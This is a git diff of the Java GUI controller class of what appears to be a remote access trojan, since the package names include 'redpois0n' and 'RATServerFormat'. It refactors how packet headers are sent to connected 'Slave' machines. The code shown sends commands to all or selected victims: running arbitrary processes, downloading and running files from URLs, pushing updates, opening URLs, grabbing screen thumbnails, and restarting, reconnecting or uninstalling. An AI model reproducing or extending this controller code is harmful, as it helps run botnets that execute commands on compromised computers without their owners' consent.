@@ -55,8 +55,11 @@ import com.redpois0n.events.Events;
 import com.redpois0n.exceptions.CloseException;
 import com.redpois0n.listeners.CountryMenuItemListener;
 import com.redpois0n.net.URLParser;
+import com.redpois0n.packets.OutgoingHeader;
 import com.redpois0n.packets.incoming.PacketBuilder;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.outgoing.Packet11Disconnect;
+import com.redpois0n.packets.outgoing.Packet37RestartJavaProcess;
+import com.redpois0n.packets.outgoing.Packet45Reconnect;
 import com.redpois0n.plugins.Plugin;
 import com.redpois0n.plugins.PluginLoader;
 import com.redpois0n.plugins.RATServerFormat;
@@ -183,7 +186,7 @@ public class Frame extends BaseFrame {
 					for (int i = 0; i < Main.connections.size(); i++) {
 						Slave sl = Main.connections.get(i);
 						if (sl.getThumbnail() == null) {
-							sl.addToSendQueue(Header.THUMBNAIL);
+							sl.addToSendQueue(new Packet40Thumbnail());
 						} else {
 							int row = Util.getRow(sl);
 							mainModel.setValueAt(sl.getThumbnail(), row, 0);
@@ -501,8 +504,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm restarting all servers")) {
 						for (Slave sl : list) {
 							try {
-								sl.addToSendQueue(Header.RESTART_JVM);
-								sl.closeSocket(new CloseException("Restarting connection"));
+								sl.addToSendQueue(new Packet37RestartJavaProcess());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -523,8 +525,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm disconnecting all servers")) {
 						for (Slave sl : list) {
 							try {
-								sl.addToSendQueue(Header.DISCONNECT);
-								sl.closeSocket(new CloseException("Disconnecting"));
+								sl.addToSendQueue(new Packet11Disconnect());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -543,8 +544,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm reconnecting all servers")) {
 						for (Slave sl : list) {
 							try {
-								sl.addToSendQueue(Header.RECONNECT);
-								sl.closeSocket(new CloseException("Reconnecting"));
+								sl.addToSendQueue(new Packet45Reconnect());
 							} catch (Exception ex) {
 								ex.printStackTrace();
 							}
@@ -567,7 +567,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm uninstalling all servers")) {
 						for (Slave sl : list) {
 							try {
-								sl.addToSendQueue(Header.UNINSTALL);
+								sl.addToSendQueue(OutgoingHeader.UNINSTALL);
 								sl.closeSocket(new CloseException("Uninstalling"));
 							} catch (Exception ex) {
 								ex.printStackTrace();
@@ -601,7 +601,7 @@ public class Frame extends BaseFrame {
 					Slave sl = Util.getSlave(mainModel.getValueAt(i, 3).toString());
 					if (sl != null) {
 						if (!sl.getVersion().equals(Version.getVersion())) {
-							sl.addToSendQueue(new PacketBuilder(Header.UPDATE, new String[] { result.trim().replace(" ", "%20") }));
+							sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE, new String[] { result.trim().replace(" ", "%20") }));
 							++servers;
 						}
 					}
@@ -646,7 +646,7 @@ public class Frame extends BaseFrame {
 			public void actionPerformed(ActionEvent arg0) {
 				for (int i = 0; i < Main.connections.size(); i++) {
 					Slave sl = Main.connections.get(i);
-					sl.addToSendQueue(Header.THUMBNAIL);
+					sl.addToSendQueue(OutgoingHeader.THUMBNAIL);
 				}
 			}
 		});
@@ -867,7 +867,7 @@ public class Frame extends BaseFrame {
 					}
 
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new PacketBuilder(Header.VISIT_URL, new String[] { result.trim() }));
+						slave.addToSendQueue(new PacketBuilder(OutgoingHeader.VISIT_URL, new String[] { result.trim() }));
 					}
 				}
 
@@ -982,7 +982,7 @@ public class Frame extends BaseFrame {
 					}
 
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new PacketBuilder(Header.RUN_COMMAND, new String[] { process }));
+						slave.addToSendQueue(new PacketBuilder(OutgoingHeader.RUN_COMMAND, new String[] { process }));
 					}
 				}
 			}
@@ -1007,7 +1007,7 @@ public class Frame extends BaseFrame {
 						return;
 					}	
 					for (Slave sl : servers) {
-						sl.addToSendQueue(new PacketBuilder(Header.UPDATE, new String[] { result.trim().replace(" ", "%20") }));
+						sl.addToSendQueue(new PacketBuilder(OutgoingHeader.UPDATE, new String[] { result.trim().replace(" ", "%20") }));
 					}
 				}
 			}
@@ -1033,7 +1033,7 @@ public class Frame extends BaseFrame {
 					}			
 
 					for (Slave slave : servers) {
-						slave.addToSendQueue(new PacketBuilder(Header.DOWNLOAD_URL, new String[] { result.trim().replace(" ", "%20") }));
+						slave.addToSendQueue(new PacketBuilder(OutgoingHeader.DOWNLOAD_URL, new String[] { result.trim().replace(" ", "%20") }));
 					}
 				}
 			}
@@ -1296,7 +1296,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm disconnecting " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(new PacketBuilder(Header.DISCONNECT));
+								sl.addToSendQueue(new PacketBuilder(OutgoingHeader.DISCONNECT));
 								sl.closeSocket(new CloseException("Disconnecting"));
 							} catch (Exception ex) {
 								ex.printStackTrace();
@@ -1315,7 +1315,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm restarting " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(Header.RESTART_JVM);
+								sl.addToSendQueue(OutgoingHeader.RESTART_JVM);
 								sl.closeSocket(new CloseException("Restarting connection"));
 							} catch (Exception ex) {
 								ex.printStackTrace();
@@ -1350,7 +1350,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm reconnect " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(Header.RECONNECT);
+								sl.addToSendQueue(OutgoingHeader.RECONNECT);
 								sl.closeSocket(new CloseException("Reconnecting"));
 							} catch (Exception ex) {
 								ex.printStackTrace();
@@ -1373,7 +1373,7 @@ public class Frame extends BaseFrame {
 					if (Util.yesNo("Confirm", "Confirm uninstalling " + servers.size() + " servers")) {
 						for (Slave sl : servers) {
 							try {
-								sl.addToSendQueue(Header.UNINSTALL);
+								sl.addToSendQueue(OutgoingHeader.UNINSTALL);
 								sl.closeSocket(new CloseException("Uninstalling"));
 							} catch (Exception ex) {
 								ex.printStackTrace();
